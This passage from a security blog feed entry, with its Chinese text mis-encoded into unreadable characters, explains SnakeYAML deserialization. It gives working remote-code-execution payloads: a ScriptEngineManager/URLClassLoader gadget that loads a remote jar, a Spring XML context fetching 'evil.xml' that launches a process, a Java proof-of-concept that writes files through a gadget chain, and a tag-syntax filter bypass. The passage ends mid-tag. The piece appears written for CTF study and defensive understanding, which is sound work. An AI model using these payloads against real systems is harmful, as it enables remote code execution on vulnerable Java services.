    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SnakeYaml</title>
    <link href="/2024/08/03/SnakeYaml/"/>
    <url>/2024/08/03/SnakeYaml/</url>
    
    <content type="html"><![CDATA[<p>SnakeYamlä¹Ÿç®—æ˜¯å¸¸è§çš„åŒ…ï¼Œåœ¨ä¹‹å‰æ‰“é¢˜çš„æ—¶å€™é‡åˆ°è¿‡ï¼Œå›½å†³javaé¢˜ä¸¤é“solonä¹Ÿæœ‰è¿™ä¸ªåŒ…ã€‚</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>SnakeYamlæ˜¯ä¸€ä¸ªå®Œæ•´çš„YAML1.1è§„èŒƒProcessorï¼Œç”¨äºè§£æYAMLï¼Œåºåˆ—åŒ–ä»¥åŠååºåˆ—åŒ–ï¼Œæ”¯æŒUTF-8&#x2F;UTF-16ï¼Œæ”¯æŒJavaå¯¹è±¡çš„åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–ï¼Œæ”¯æŒæ‰€æœ‰YAMLå®šä¹‰çš„ç±»å‹ã€‚</p><h2 id="Basic-Practice"><a href="#Basic-Practice" class="headerlink" title="Basic Practice"></a>Basic Practice</h2><p>ä¾èµ–å¦‚ä¸‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.yaml<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>snakeyaml<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.27<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸¤ä¸ªæ–¹æ³•ï¼š</p><ul><li>Yaml.load()ï¼šå…¥å‚æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–è€…ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿”å›ä¸€ä¸ªJavaå¯¹è±¡</li><li>Yaml.dump()ï¼šå°†ä¸€ä¸ªå¯¹è±¡è½¬åŒ–ä¸ºyamlæ–‡ä»¶å½¢å¼</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.snake.demo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Non Arg Constructor&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I am &quot;</span> + name + <span class="hljs-string">&quot;, &quot;</span> + age + <span class="hljs-string">&quot; years old&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;taco&quot;</span>, <span class="hljs-number">18</span>);<br><span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br>System.out.println(yaml.dump(user));<br></code></pre></td></tr></table></figure><blockquote><p>æ‰“å°ç»“æœ:</p><p>getName</p><p>!!com.snake.demo.User {age: 18, name: taco}</p></blockquote><p><strong>!!ç”¨äºå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œä¸fastjsonä¸­@typeå­—æ®µç±»ä¼¼</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">dump()è¿˜è°ƒç”¨äº†é<span class="hljs-keyword">public</span>æˆå‘˜çš„getter<br></code></pre></td></tr></table></figure><h3 id="load"><a href="#load" class="headerlink" title="load"></a>load</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!com.snake.demo.User &#123;age: 18, name: taco&#125;&quot;</span>;<br><span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> yaml.load(s);<br>System.out.println(user);<br></code></pre></td></tr></table></figure><blockquote><p>Non Arg Constructor</p><p>setName</p><p>I am taco, 18 years old</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">load()è°ƒç”¨äº†æ— å‚æ„é€ å™¨å’Œé<span class="hljs-keyword">public</span>æˆå‘˜çš„setter<br></code></pre></td></tr></table></figure><p>å®é™…ä¸Šä¸ä»…æ— å‚æ„é€ å™¨èƒ½å¤Ÿè°ƒç”¨ï¼Œè¿˜èƒ½æŒ‡å®šè°ƒç”¨æœ‰å‚æ„é€ å™¨ï¼Œåªè¦ä¼ å‚ç±»å‹ä¸ºæœ‰å‚æ„é€ å™¨çš„å‚æ•°ç±»å‹å³å¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!com.snake.demo.User [\&quot;taco\&quot;, 18]&quot;</span>;<br><span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> yaml.load(s);<br>System.out.println(user);<br></code></pre></td></tr></table></figure><blockquote><p>Arg Constructor Called</p><p>I am taco, 18 years old</p></blockquote><p>æ­¤æ—¶å°±ä¸ä¼šè°ƒç”¨<code>setter</code>æ–¹æ³•äº†</p><blockquote><p>è‹¥ç±»å±æ€§æ˜¯publicä¿®é¥°ï¼Œä¸ä¼šè°ƒç”¨å¯¹åº”çš„setteræ–¹æ³•ï¼Œè€Œæ˜¯é€šè¿‡åå°„æ¥set</p></blockquote><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>yamlååºåˆ—åŒ–æ—¶é€šè¿‡<code>!!</code> + å…¨ç±»åæŒ‡å®šååºåˆ—åŒ–çš„ç±»ï¼Œå’Œfastjsonä¸€æ ·éƒ½ä¼šè°ƒç”¨setterï¼Œä¸è¿‡å¯¹äºpublicä¿®é¥°çš„æˆå‘˜ä¸ä¼šè°ƒç”¨å…¶setterï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œsnakeyamlååºåˆ—åŒ–æ—¶è¿˜èƒ½è°ƒç”¨è¯¥ç±»çš„æ„é€ å‡½æ•°ï¼ˆfastjsonæ˜¯é€šè¿‡ASMç”Ÿæˆçš„ï¼‰ã€‚</p><h3 id="ScriptEngineManager"><a href="#ScriptEngineManager" class="headerlink" title="ScriptEngineManager"></a>ScriptEngineManager</h3><p>æ„é€ <code>ScriptEngineManager</code>payloadï¼Œåˆ©ç”¨SPIæœºåˆ¶é€šè¿‡<code>URLClassLoader</code>è¿œç¨‹åŠ è½½æ¶æ„å­—èŠ‚ç æ–‡ä»¶ã€‚</p><p>Githubä¸Šé¢çš„EXPï¼š<a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p>å·¥å…·çš„å·¥ç¨‹classpathä¸‹å­˜åœ¨<code>META-INF/services</code>æ–‡ä»¶å¤¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.script.ScriptEngineFactory<br></code></pre></td></tr></table></figure><blockquote><p>artsploit.AwesomeScriptEngineFactory</p></blockquote><p>æ‰“æˆjaråŒ…</p><blockquote><p>javac src&#x2F;artsploit&#x2F;AwesomeScriptEngineFactory.java</p><p>jar -cvf yaml-payload.jar -C src&#x2F; .</p></blockquote><p>å°†ç”Ÿæˆyaml-payload.jaråŒ…æ”¾åœ¨webæœåŠ¡ä¸Š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m http.server 9999<br></code></pre></td></tr></table></figure><blockquote><p>!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [â€œ<a href="http://127.0.0.1:9999/yaml-payload.jar%22]">http://127.0.0.1:9999/yaml-payload.jar&quot;]</a> ]] ]</p></blockquote><p><img src="/2024/08/03/SnakeYaml/image-20240803154021356.png" alt="image-20240803154021356"></p><p>è§¦å‘æµç¨‹å¦‚ä¸‹ï¼š</p><p><code>javax.script.ScriptEngineManager</code></p><p><img src="/2024/08/03/SnakeYaml/image-20240803154059167.png" alt="image-20240803154059167"></p><p><img src="/2024/08/03/SnakeYaml/image-20240803154133518.png" alt="image-20240803154133518"></p><p><code>ScriptEngineManager</code>çš„æ— å‚æ„é€ å™¨è°ƒç”¨äº†init()ï¼Œè¿›è¡Œåˆå§‹åŒ–è®¾ç½®åè°ƒç”¨<code>initEngines()</code>ï¼Œç”¨äºåˆå§‹åŒ–è„šæœ¬å¼•æ“ã€‚</p><p>æ¥ç€åˆ°<code>getServiceLoader</code>ï¼Œç”¨äºè·å–<code>ServiceLoader</code>è¿­ä»£å™¨</p><p><img src="/2024/08/03/SnakeYaml/image-20240803154442837.png" alt="image-20240803154442837"></p><p>åˆ°äº†ç†Ÿæ‚‰çš„<code>ServiceLoader.load()</code>è¿”å›ä¸€ä¸ª<code>ServiceLoader&lt;T&gt;</code>ï¼Œæ ¹æ®è¿™ä¸ªå¯ä»¥è·å–ä¸€ä¸ªè¿­ä»£å™¨ï¼Œæ¥ä¸‹æ¥è¿˜æ˜¯ç†Ÿæ‚‰çš„è¿­ä»£éå†ã€‚</p><p><img src="/2024/08/03/SnakeYaml/image-20240803154716142.png" alt="image-20240803154716142"></p><p><code>next() =&gt; nextService()</code>ä¼šåŠ è½½æ¥å£å®ç°ç±»å¹¶å®ä¾‹åŒ–ï¼Œç½‘ä¸Šæœ‰è¯¦è§£ã€‚</p><h3 id="SpringFrameworkè¿œç¨‹åŠ è½½é…ç½®"><a href="#SpringFrameworkè¿œç¨‹åŠ è½½é…ç½®" class="headerlink" title="SpringFrameworkè¿œç¨‹åŠ è½½é…ç½®"></a>SpringFrameworkè¿œç¨‹åŠ è½½é…ç½®</h3><p>Springå½“ä¸­æœ‰ä¸¤ä¸ªç±»çš„æ„é€ å‡½æ•°è¿œç¨‹åŠ è½½é…ç½®ï¼Œå¯ä»¥æ„æˆRCE</p><blockquote><p>org.springframework.context.support.ClassPathXmlApplicationContext org.springframework.context.support.FileSystemXmlApplicationContext</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:p</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/p&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exec&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>!!org.springframework.context.support.ClassPathXmlApplicationContext [â€œ<a href="http://127.0.0.1:8888/evil.xml%22]">http://127.0.0.1:8888/evil.xml&quot;]</a></p></blockquote><p>æ—¢ç„¶èƒ½è§¦å‘getterï¼Œé‚£ä¹ˆfastjsonçš„å¤§éƒ¨åˆ†payloadä¹Ÿå¯ä»¥ç”¨ã€‚</p><h3 id="å†™æ–‡ä»¶åŠ è½½æœ¬åœ°jar"><a href="#å†™æ–‡ä»¶åŠ è½½æœ¬åœ°jar" class="headerlink" title="å†™æ–‡ä»¶åŠ è½½æœ¬åœ°jar"></a>å†™æ–‡ä»¶åŠ è½½æœ¬åœ°jar</h3><blockquote><p>!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [â€œfilePathâ€],false],!!java.util.zip.Inflater { input: !!binary base64 },length]]</p></blockquote><p>filepathæ˜¯å†™å…¥è·¯å¾„ï¼Œbase64strä¸ºç»è¿‡zlibå‹ç¼©è¿‡åçš„æ–‡ä»¶å†…å®¹,lengthä¸ºæ–‡ä»¶å¤§å°</p><p>å’Œfastjsonä¸€æ ·ï¼Œå¯¹äºbyteæ•°ç»„ä¼šè‡ªåŠ¨è¿›è¡Œbase64è§£ç (snakeyamlä¸­ä¸ºbinary)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.utils.JavaUtils;<br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.zip.Deflater;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SnakeYamlFilePOC</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> createPoc(<span class="hljs-string">&quot;E:/flag.txt&quot;</span>, <span class="hljs-string">&quot;E:/a.txt&quot;</span>);<br>        System.out.println(poc);<br><span class="hljs-comment">//        Yaml yaml = new Yaml();</span><br><span class="hljs-comment">//        yaml.load(poc);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">createPoc</span><span class="hljs-params">(String src, String path)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">byte</span>[] file = JavaUtils.getBytesFromFile(src);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> file.length;<br>        <span class="hljs-type">byte</span>[] compressed = compress(file);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">b64</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(compressed);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!sun.rmi.server.MarshalOutputStream &quot;</span> +<br>                <span class="hljs-string">&quot;[!!java.util.zip.InflaterOutputStream [&quot;</span> +<br>                    <span class="hljs-string">&quot;!!java.io.FileOutputStream [&quot;</span> +<br>                        <span class="hljs-string">&quot;!!java.io.File [\&quot;&quot;</span> + path + <span class="hljs-string">&quot;\&quot;],false],&quot;</span> +<br>                        <span class="hljs-string">&quot;!!java.util.zip.Inflater  &#123; input: !!binary &quot;</span> + b64 + <span class="hljs-string">&quot; &#125;, &quot;</span> + length +<br>                        <span class="hljs-string">&quot;]]&quot;</span>;<br>        <span class="hljs-keyword">return</span> payload;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] compress(<span class="hljs-type">byte</span>[] input) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Deflater</span> <span class="hljs-variable">deflater</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Deflater</span>();<br>        deflater.setInput(input);<br>        deflater.finish();<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">while</span> (!deflater.finished()) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">compressedSize</span> <span class="hljs-operator">=</span> deflater.deflate(buffer);<br>            outputStream.write(buffer, <span class="hljs-number">0</span>, compressedSize);<br>        &#125;<br><br>        outputStream.close();<br>        <span class="hljs-keyword">return</span> outputStream.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ—¢ç„¶å¯ä»¥å†™æ–‡ä»¶ï¼Œé‚£å°±æŠŠjarå†™å…¥ç›®æ ‡ç¯å¢ƒï¼Œç„¶åå†é€šè¿‡URLClassloaderæœ¬åœ°åŠ è½½</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br><span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> createPoc(<span class="hljs-string">&quot;./yaml-payload.jar&quot;</span>, <span class="hljs-string">&quot;E:/evil.jar&quot;</span>);<br>yaml.load(poc);<br><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +<br>    <span class="hljs-string">&quot;!!java.net.URLClassLoader [[\n&quot;</span> +<br>    <span class="hljs-string">&quot;!!java.net.URL [\&quot;file:///E:/evil.jar\&quot;]\n&quot;</span> +<br>    <span class="hljs-string">&quot;]]\n&quot;</span> +<br>    <span class="hljs-string">&quot;]&quot;</span>;<br>yaml.load(s);<br></code></pre></td></tr></table></figure><h2 id="Yaml-load"><a href="#Yaml-load" class="headerlink" title="Yaml#load()"></a>Yaml#load()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">load</span><span class="hljs-params">(String yaml)</span> &#123;<br><span class="hljs-keyword">return</span> (T) loadFromReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamReader</span>(yaml), Object.class);<br>&#125;<br></code></pre></td></tr></table></figure><p>payloadå­˜å‚¨äºStreamReaderçš„streamå­—æ®µï¼š</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155110646.png" alt="image-20240803155110646"></p><p>å›åˆ°<code>loadFromReader()</code>ï¼Œåˆ›å»ºäº†ä¸€ä¸ªComposerå¯¹è±¡ï¼Œå¹¶å°è£…åˆ°<code>constructor</code>ä¸­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">loadFromReader</span><span class="hljs-params">(StreamReader sreader, Class&lt;?&gt; type)</span> &#123;<br>    <span class="hljs-type">Composer</span> <span class="hljs-variable">composer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Composer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ParserImpl</span>(sreader), resolver, loadingConfig);<br>    constructor.setComposer(composer);<br>    <span class="hljs-keyword">return</span> constructor.getSingleData(type);<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›<code>getSingleData</code>ï¼š</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155215536.png" alt="image-20240803155215536"></p><p><code>getSingleNode()</code>å°†pocæ”¹é€ ä¸ºå¦‚ä¸‹ï¼š</p><blockquote><p>&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag&#x3D;tag:yaml.org,2002:javax.script.ScriptEngineManager, value&#x3D;[&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag&#x3D;tag:yaml.org,2002:java.net.URLClassLoader, value&#x3D;[&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag&#x3D;tag:yaml.org,2002:seq, value&#x3D;[&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag&#x3D;tag:yaml.org,2002:java.net.URL, value&#x3D;[&lt;org.yaml.snakeyaml.nodes.ScalarNode (tag&#x3D;tag:yaml.org,2002:str, value&#x3D;<a href="http://127.0.0.1:9999/yaml-payload.jar)%3E])%3E])%3E])%3E])%3E">http://127.0.0.1:9999/yaml-payload.jar)&gt;])&gt;])&gt;])&gt;])&gt;</a></p></blockquote><p>è‹¥è¿‡æ»¤äº†<code>!!</code>ï¼Œå¯åˆ©ç”¨æ­¤tagè§„åˆ™è¿›è¡Œç»•è¿‡ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">!tag:yaml.org,<span class="hljs-number">2002</span>:javax.script.ScriptEngineManager [!tag:yaml.org,<span class="hljs-number">2002</span>:java.net.URLClassLoader [[!tag:yaml.org,<span class="hljs-number">2002</span>:java.net.URL [<span class="hljs-string">&quot;http://ip/yaml-payload.jar&quot;</span>]]]]<br></code></pre></td></tr></table></figure><p>æ¥ç€è°ƒç”¨<code>constructDocument()</code>å¯¹ä¸Šé¢pocè¿›è¡Œå¤„ç†ï¼š</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155327831.png" alt="image-20240803155327831"></p><p>è·Ÿè¿›<code>constructObject()</code> &#x3D;&gt; <code>constructObjectNoCheck()</code>ï¼š</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155346497.png" alt="image-20240803155346497"></p><p>nodeæ”¾å…¥<code>recursiveObjects</code>ï¼Œè¿›å…¥<code>constructor.construct(node)</code>ï¼š</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155404381.png" alt="image-20240803155404381"></p><p><img src="/2024/08/03/SnakeYaml/image-20240803155418302.png" alt="image-20240803155418302"></p><p>éå†èŠ‚ç‚¹ï¼Œè°ƒç”¨<code>constructObject()</code>åˆå¾ªç¯å›å»äº†</p><blockquote><p>constructObjectNoCheck()-&gt;</p><p>BaseConstructor#construct()-&gt;</p><p>Contructor#construct()-&gt;</p><p>é€’å½’Contructor#constructObject()</p></blockquote><p>ä¸Šé¢çš„POCæœ‰5ä¸ªnodeï¼Œæ‰€ä»¥å¾ªç¯5æ¬¡ã€‚</p><p>å…ˆåè¿›è¡Œäº†URLã€URLClassLoaderã€ScriptEngineManagerçš„å®ä¾‹åŒ–</p><p>æ³¨æ„è¿™é‡Œå®ä¾‹åŒ–æ˜¯æœ‰ä¼ å‚æ•°(argumentList)çš„ï¼ŒæŠŠå‰ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–å¯¹è±¡å½“ä½œä¸‹ä¸ªç±»æ„é€ å™¨çš„å‚æ•°ã€‚</p><p>æœ€åè¿›å…¥ScriptEngineManagerçš„æ— å‚æ„é€ å™¨ï¼Œè¿æ¥ä¸Šäº†ä¸Šæ–‡çš„SPIæœºåˆ¶ã€‚</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155529534.png" 